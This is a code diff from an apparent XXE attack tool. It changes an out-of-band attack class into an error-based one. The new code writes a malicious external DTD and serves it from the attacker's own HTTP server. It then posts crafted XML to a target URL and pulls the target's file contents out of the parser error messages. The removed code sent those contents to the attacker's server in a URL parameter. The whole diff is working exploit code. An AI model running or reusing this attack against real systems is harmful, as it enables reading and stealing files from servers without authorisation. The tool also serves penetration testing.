@@ -5,11 +5,11 @@ from typing import Sequence
 from xeely import RESOURCES_PATH
 from xeely.custom_http import HTTPClient
 from xeely.custom_http.server import HTTPServerParams
-from xeely.custom_http.server import LogsManager
 from xeely.custom_http.server import run_http_server
 from xeely.custom_xml import XML
 from xeely.custom_xml import XMLDoctype
 from xeely.custom_xml import XMLEntity
+from xeely.xxe import cdata
 from xeely.xxe.attacks.base import BaseXXEAttack
 from xeely.xxe.attacks.factory import factory
 from xeely.xxe.doctype import write_doctype_content_to_disk
@@ -17,21 +17,35 @@ from xeely.xxe.errors import InvalidOptionException
 from xeely.xxe.errors import ReverseConnectionParamsNotSpecified
 from xeely.xxe.strategy import XXEAttackStrategy
 
-OOB_DTD_FILE_PATH = RESOURCES_PATH / "oob.dtd"
-OOB_ENTITY_NAME = "oob"
-EXPLOIT_ENTITY_NAME = "content"
+ERROR_DTD_FILE_PATH = RESOURCES_PATH / "error.dtd"
+ERROR_ENTITY_NAME = "error"
+SEPARATOR = "=="
 
 
-def create_oob_dtd_file(resource: str, http_server_params: HTTPServerParams):
-    file_entity_name = "file"
+def create_error_dtd_file(
+    resource: str, http_server_params: HTTPServerParams, use_cdata_flag: bool
+):
+    entity_name_to_use = cdata.CDATA_EXPLOIT_ENTITY_NAME if use_cdata_flag else "file"
+
+    if use_cdata_flag:
+        entities = [
+            *cdata.get_cdata_entities(resource),
+            cdata.get_cdata_joined_entity(is_parameter=True),
+        ]
+    else:
+        entities = [
+            XMLEntity(
+                _name=entity_name_to_use, _value=resource, _is_external=True, _is_parameter=True
+            )
+        ]
 
     entities = [
-        XMLEntity(_name=file_entity_name, _value=resource, _is_parameter=True, _is_external=True),
+        *entities,
         XMLEntity(
-            _name=OOB_ENTITY_NAME,
+            _name=ERROR_ENTITY_NAME,
             _value=XMLEntity(
-                _name=EXPLOIT_ENTITY_NAME,
-                _value=f"{http_server_params.get_base_url()}/?content=%{file_entity_name};",
+                _name="content",
+                _value=f"%nonExistingEntity;{SEPARATOR}%{entity_name_to_use};{SEPARATOR}",
                 _is_external=True,
             )
             .to_xml()
@@ -40,15 +54,15 @@ def create_oob_dtd_file(resource: str, http_server_params: HTTPServerParams):
         ),
     ]
 
-    write_doctype_content_to_disk(OOB_DTD_FILE_PATH, entities)
+    write_doctype_content_to_disk(ERROR_DTD_FILE_PATH, entities)
 
 
-def delete_oob_dtd_file():
-    os.remove(OOB_DTD_FILE_PATH)
+def delete_error_dtd_file():
+    os.remove(ERROR_DTD_FILE_PATH)
 
 
-@factory.register(name=XXEAttackStrategy.OOB.value)
-class OOBAttack(BaseXXEAttack):
+@factory.register(name=XXEAttackStrategy.ERROR_BASED.value)
+class ErrorBasedAttack(BaseXXEAttack):
     def __init__(
         self,
         target_url: str,
@@ -64,10 +78,8 @@ class OOBAttack(BaseXXEAttack):
     def _check_params(self):
         if self.get_http_server_params() is None:
             raise ReverseConnectionParamsNotSpecified()
-        if not self.get_encode_data_with_base64():
+        if self.get_encode_data_with_base64():
             raise InvalidOptionException("phpfilter")
-        if self.get_use_cdata_tag():
-            raise InvalidOptionException("cdata")
 
     def _configure_xml_for_attack(self, resource: str):
         http_server_params = self.get_http_server_params()
@@ -77,25 +89,16 @@ class OOBAttack(BaseXXEAttack):
         entities: Sequence[XMLEntity | str] = [
             XMLEntity(
                 _name="remote",
-                _value=f"{http_server_params.get_base_url()}/{OOB_DTD_FILE_PATH.name}",
+                _value=f"{http_server_params.get_base_url()}/{ERROR_DTD_FILE_PATH.name}",
                 _is_external=True,
                 _is_parameter=True,
             ),
             "%remote;",
-            f"%{OOB_ENTITY_NAME};",
+            f"%{ERROR_ENTITY_NAME};",
         ]
 
         xml = self.get_xml()
         doctype = XMLDoctype(xml.get_root_node_name(), entities)
-
-        # Replacing the value of a text element
-        text_elements = xml.get_text_elements()
-
-        if len(text_elements) == 0:
-            raise Exception("Cannot perform the attack no text element found!")
-        text_element = text_elements[0]
-
-        xml.change_text_element_value(text_element.get_name(), f"&{EXPLOIT_ENTITY_NAME};")
 
         xml.set_doctype(doctype)
 
@@ -107,14 +110,14 @@ class OOBAttack(BaseXXEAttack):
         with run_http_server(
             lhost=http_server_params.get_host(), lport=http_server_params.get_port()
         ):
-            create_oob_dtd_file(resource=self.get_resource(), http_server_params=http_server_params)
-            HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
-            delete_oob_dtd_file()
+            create_error_dtd_file(
+                resource=self.get_resource(),
+                http_server_params=http_server_params,
+                use_cdata_flag=self.get_use_cdata_tag(),
+            )
+            response = HTTPClient.send_post_request(self.get_target_url(), self.get_xml().to_xml())
+            delete_error_dtd_file()
 
-            # Getting latest logs
-            latest_log = LogsManager.get_instance().get_latest_log()
-
-            if latest_log is None:
-                raise Exception("Could not retrieve the log containing base64 content!")
-
-            return latest_log.split("content=")[1].split(" ")[0]
+            body_splitted = response.body.split(SEPARATOR)
+            data = "" if len(body_splitted) != 3 else body_splitted[1]
+            return data
